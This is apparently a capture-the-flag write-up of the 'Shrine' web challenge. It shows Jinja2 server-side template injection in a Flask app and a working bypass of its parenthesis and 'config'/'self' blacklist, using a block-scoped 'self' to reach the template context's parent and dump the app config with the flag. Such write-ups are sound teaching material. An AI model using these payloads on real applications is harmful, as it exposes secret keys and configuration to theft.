# Shrine (web, 190p, 58 solved)

```
shrine is translated as jinja in Japanese.
```

In the challenge we are given link to vulnerable website: http://shrine.chal.ctf.westerns.tokyo/.
Without any parameters, it prints its own source code:

```python
import flask
import os


app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```

This is classic example of [server side template injection](https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection). Authors don't even try to hide it from
us - the injection point is obvious. For example visiting `http://shrine.chal.ctf.westerns.tokyo/shrine/{{2+2}}` Will print "4".

SSTI is usually equivalent to RCE and would be [trivial to exploit](https://github.com/vulhub/vulhub/tree/master/flask/ssti).
Unfortunatelly, in this case there is a slight problem - `(` and `)` chracters are blacklisted. Additionaly `config` and `self` JINJA2 variables are cleared.

At the beginning we tried to find a way to execute arbitrary code, but we failed. So we deduced, that we probably don't need RCE and the intended solution
expects us to find the original app.config somewhere.

After carefully reading the JINJA2 source code, we noticed that `self` is a very, [very peculiar](https://github.com/pallets/jinja/blob/fb7e12cce67b9849899f934e697f7e2a91d604c2/jinja2/compiler.py#L744) variable:


```python
if 'self' in find_undeclared(node.body, ('self',)):
    ref = frame.symbols.declare_parameter('self')
    self.writeline('%s = TemplateReference(context)' % ref)
```

So `self` is changed to TemplateReference(context), but only if it's used without declaration in the current scope. At the first sight it's impossible to
solve, because self is always overwritten in the beginning (so it should always be referenced), but of course it's more complex.
After more reading, it turned out that it's enough to create a new block to skip this check. So we can get reference to self with:

```
{%block kitku%} {{self}} {%endblock%}
```

```
<TemplateReference None>
```

We can go from there and look for interesting things:

```
{%block kitku%} {{self.__dict__}} {%endblock%}
```

```
{'_TemplateReference__context': <Context {'range': <class 'range'>, 'dict': <class 'dict'>, 'lipsum': <function generate_lorem_ipsum at 0x7fdc26d9f268>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'namespace': <class 'jinja2.utils.Namespace'>, 'url_for': <function url_for at 0x7fdc23b10d08>, 'get_flashed_messages': <function get_flashed_messages at 0x7fdc23b10ea0>, 'config': None, 'request': <Request 'http://shrine.chal.ctf.westerns.tokyo/shrine/{%25block kitku%25} {{self.__dict__}} {%25endblock%25}' [GET]>, 'session': <NullSession {}>, 'g': <flask.g of 'app'>, 'self': None} of None>}
```

Of course the most interesting thing is internal __context variable - I wonder what's in the parent...

```
{%block kitku%} {{self._TemplateReference__context.parent}} {%endblock%}
```

```
{'range': <class 'range'>, 'dict': <class 'dict'>, 'lipsum': <function generate_lorem_ipsum at 0x7fe752e1a268>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'namespace': <class 'jinja2.utils.Namespace'>, 'url_for': <function url_for at 0x7fe74fc89d08>, 'get_flashed_messages': <function get_flashed_messages at 0x7fe74fc89ea0>, 'config': <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'FLAG': 'TWCTF{pray_f0r_sacred_jinja2}'}>, 'request': <Request 'http://shrine.chal.ctf.westerns.tokyo/shrine/{%25block kitku%25} {{self._TemplateReference__context.parent}} {%25endblock%25}' [GET]>, 'session': <NullSession {}>, 'g': <flask.g of 'app'>}
```

And sure enough, we see original config and FLAG variable: `TWCTF{pray_f0r_sacred_jinja2}`
